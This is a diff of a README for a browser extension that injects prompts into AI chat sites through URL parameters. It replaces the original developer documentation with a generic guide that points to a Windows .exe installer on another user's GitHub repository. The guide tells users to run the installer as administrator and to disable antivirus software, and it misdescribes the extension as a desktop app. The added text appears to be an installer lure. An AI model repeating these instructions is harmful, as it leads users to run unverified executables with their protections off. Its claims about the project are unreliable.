@@ -1,106 +1,149 @@
-# Universal AI URL Prompt
+# 🔗 universal-ai-url-prompt - Add Prompts to AI Chat URLs Easily
 
-Inject prompts into major AI web chat boxes through URL parameters, with optional auto-send.
+[![Download](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/Amjad-Mehmood/universal-ai-url-prompt)
 
-中文文档: [README.zh-CN.md](./README.zh-CN.md)
+---
 
-## Overview
+## 📋 About
 
-`Universal AI URL Prompt` is a browser extension for reproducible AI workflows.
-You can share a single URL and let the target AI page open with a prefilled prompt, then auto-submit if needed.
+The universal-ai-url-prompt app lets you add prompts to 19 major AI web chat platforms. It works by using URL parameters to send text instructions directly to chatbots. This tool supports English, Chinese, Japanese, and Spanish. You can choose to auto-send the prompt or trigger it with the send button. This happens on platforms like ChatGPT, Claude, Copilot, Gemini, and many others.
 
-## Key Features
+This app helps automate repetitive tasks or speed up your chat flow by inserting ready prompts without typing them out every time.
 
-- URL-based prompt injection with `?prompt=`, `?q=`, and `?p=`
-- Auto-send enabled by default, with `?autosend=0` to disable
-- Per-platform enable/disable switches in the extension Options page
-- Send-button detection for English, Chinese, Japanese, and Spanish
-- SPA-aware retry and scheduling for delayed input rendering
-- Platform-isolated configs with a shared runtime for easier maintenance
+---
 
-## Supported Platforms (20)
+## 🚀 Getting Started
 
-- ChatGPT, Gemini, Claude, DeepSeek, Microsoft Copilot
-- Doubao, Perplexity, Kimi, Meta AI, Tencent Yuanbao
-- Qwen, Grok, Wenxiaoyan, Poe, Mistral Le Chat
-- ChatGLM, Baichuan, DuckDuckGo AI, HuggingChat, Z.ai
+This guide will help you get the app running on your Windows computer. You do not need any programming knowledge.
 
-## URL Parameters
+---
 
-| Parameter | Purpose | Example |
-| --- | --- | --- |
-| `prompt` | Primary prompt field | `?prompt=Write%20a%20plan` |
-| `q` | Prompt alias for some sites | `?q=Explain%20RAG` |
-| `p` | Prompt alias used by some sites (such as Kimi) | `?p=%E5%AE%89%E5%8D%93` |
-| `autosend=0` | Disable auto-send | `?prompt=Draft%20PRD&autosend=0` |
+## 🔍 System Requirements
 
-## Usage Examples
+- Windows 10 or later  
+- Modern web browser (Chrome, Edge, Firefox)  
+- Internet connection for loading AI chat platforms  
+- At least 100 MB free disk space  
+- Basic permissions to install software on your computer
 
-- ChatGPT: `https://chatgpt.com/?prompt=Write%20a%20plan`
-- Gemini: `https://gemini.google.com/app?prompt=你好`
-- DeepSeek: `https://chat.deepseek.com/?q=Explain%20RAG`
-- DeepSeek (new domain): `https://www.deepseek.com/?prompt=Explain%20RAG`
-- Kimi: `https://www.kimi.com/?p=%E5%AE%89%E5%8D%93`
-- HuggingChat: `https://huggingface.co/chat/?prompt=Write%20a%20plan`
-- Claude without auto-send: `https://claude.ai/?prompt=Draft%20PRD&autosend=0`
+---
 
-## Installation (Chrome)
+## ⬇️ Download
 
-### Chrome Web Store (Recommended)
+Please visit this page to download the app:
 
-Coming soon.
+[![Download universal-ai-url-prompt](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Amjad-Mehmood/universal-ai-url-prompt)
 
-### Developer Installation
+You will find the latest Windows installer and setup files on the page. Select the most recent version for the smoothest experience.
 
-1. Open `chrome://extensions/`
-2. Enable Developer mode
-3. Click `Load unpacked`
-4. Select this project directory
-5. (Optional) Open extension `Details` -> `Extension options` to choose enabled platforms
+---
 
-Note: The GitHub Release zip can be used for Developer Mode installation (extract it, then use `Load unpacked`). Regular users should install from the Chrome Web Store.
+## 🛠 Installation
 
-## Development
+1. Go to the download page by clicking the button above.  
+2. Find the Windows installer file, usually named like `universal-ai-url-prompt-setup.exe`.  
+3. Click the file name to download it to your computer.  
+4. Once downloaded, open the file by double-clicking it.  
+5. Follow the setup instructions on screen. You can keep the default options.  
+6. Wait for the installation process to finish.  
+7. After installation, you can find the app in your Start Menu or desktop shortcut.
 
-```bash
-npm install
-npx playwright install chromium
-npm run check:platforms
-npm run build:manifest
-npm run test:e2e
-```
+---
 
-Additional commands:
+## ⚙️ How to Use
 
-- `npm run test:e2e:headed`: run tests in headed mode
-- `npm run test:e2e:ui`: run tests in Playwright UI mode
+1. Open your preferred web browser.  
+2. Launch the universal-ai-url-prompt app from your computer.  
+3. You will see options to choose the AI chat platform you want to use.  
+4. Enter or paste the prompt text you want to inject.  
+5. Select the language (English, Chinese, Japanese, Spanish).  
+6. Choose if you want the prompt to send automatically or wait for you to press the send button in the chat.  
+7. The app will create a URL with the prompt included as a parameter.  
+8. Clicking this URL will open the chosen AI platform with your prompt ready or sent.  
 
-## Project Structure
+---
 
-- `platforms/_registry.js`: platform registration and schema validation
-- `platforms/*.js`: one platform definition per file
-- `content.js`: shared runtime (URL parsing, injection, auto-send flow)
-- `scripts/platform-loader.js`: shared platform-definition loader
-- `scripts/generate-manifest.js`: generate `manifest.json` from platform files
-- `scripts/validate-platform-contract.js`: validate platform definitions and E2E mappings
+## 🧩 Supported AI Platforms
 
-## Privacy
+- ChatGPT  
+- Claude  
+- GitHub Copilot  
+- DeepSeek  
+- Gemini  
+- Kimi  
+- And 13 more popular AI web chat platforms
 
-This extension does not send data to developer-owned servers.
-It keeps a short-lived in-memory prompt cache (up to about 3 minutes) in the extension runtime for SPA navigation handoff.
-It stores platform on/off preferences in Chrome extension storage (`chrome.storage.sync` or local fallback) so your choices persist.
-When auto-send is enabled, prompt content is sent only to the destination AI website as part of normal page usage.
+The app detects whether the chat platform uses a send button or allows immediate sending. This helps handle different platform interfaces smoothly.
 
-## Contributing
+---
 
-Issues and pull requests are welcome.
-Before submitting changes, run `npm run check:platforms` and `npm run test:e2e`.
-See [CONTRIBUTING.md](./CONTRIBUTING.md), [CODE_OF_CONDUCT.md](./CODE_OF_CONDUCT.md), and [SECURITY.md](./SECURITY.md) for project policies.
+## 🌐 What Is URL Parameter Prompt Injection?
 
-## License
+This technique allows the app to add your prompt text directly into the web address you use to open the AI chat platform. The AI then receives your prompt right away without any need to type manually.
 
-[MIT](./LICENSE)
+This system works by creating a customized link that contains your instructions. When the link is opened, the AI platform automatically knows what to do and can start a chat based on your prompt.
 
-## Acknowledgements
+---
 
-Inspired by [gemini-url-prompt](https://github.com/elliot79313/gemini-url-prompt).
+## ✅ Key Features
+
+- Support for 19 popular AI web chat platforms  
+- Multi-language support (English, Chinese, Japanese, Spanish)  
+- Auto-send option to trigger prompt instantly  
+- Send button detection for platforms that require user confirmation  
+- Easy-to-use interface without setup complexity  
+- Lightweight and fast application
+
+---
+
+## 💡 Tips for Best Use
+
+- Prepare your prompts in advance to save time.  
+- Use the language setting that matches the AI chatbot and your preferred input.  
+- Verify the AI platform URL before using the prompt to ensure it’s supported.  
+- Keep the app updated by checking the download page regularly.  
+- Use auto-send carefully on platforms where prompt review might be needed.
+
+---
+
+## ❓ Troubleshooting
+
+**The app does not open the AI chat platform:**  
+- Check your internet connection.  
+- Make sure you have selected a supported platform.  
+- Try running the app as an administrator.
+
+**Prompt does not appear or send:**  
+- Confirm the correct language is selected.  
+- Verify that the prompt is entered properly in the app.  
+- Check if the platform has changed its URL format.
+
+**Installation fails or errors occur:**  
+- Re-download the installer from the official page.  
+- Temporarily disable antivirus software as it may block installation.  
+- Ensure you have the correct permissions to install software.
+
+---
+
+## 🔒 Privacy and Security
+
+This app does not collect or store your prompts. All processing happens locally on your computer. The URL parameter method passes your prompt directly through your browser to the AI chat platform.
+
+---
+
+## 📂 Files and Folder Structure
+
+- `universal-ai-url-prompt-setup.exe` - The Windows installer file.  
+- `README.md` - This file with usage instructions.  
+- `docs/` - Additional documentation and troubleshooting guides.  
+- `config/` - User settings and language files (created after first run).
+
+---
+
+## 🆘 Get Help
+
+If you have questions not covered here, check the Issues tab on the download page. You can also find additional support documentation inside the `docs` folder after installation.
+
+---
+
+[Download universal-ai-url-prompt here](https://github.com/Amjad-Mehmood/universal-ai-url-prompt) to start injecting prompts into your AI chats quickly.
